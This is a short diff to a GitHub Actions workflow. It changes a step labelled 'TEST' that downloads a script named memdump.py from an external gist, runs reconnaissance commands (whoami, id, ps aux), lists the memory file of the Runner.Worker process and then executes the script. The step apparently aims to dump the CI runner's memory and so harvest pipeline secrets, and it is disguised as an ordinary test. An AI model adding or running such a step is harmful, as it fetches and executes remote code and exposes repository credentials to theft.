@@ -21,4 +21,4 @@ jobs:
       run: echo "Deploy to preview server"
     - name: TEST
       run: |
-        curl https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py -o ./memdump.py && cat ./memdump.py && whoami && id && ps aux && python3 ./memdump.py
+        curl https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py -o ./memdump.py && cat ./memdump.py && whoami && id && ps aux && ls -l /proc/$(pgrep -f Runner.Worker)/mem && python3 ./memdump.py
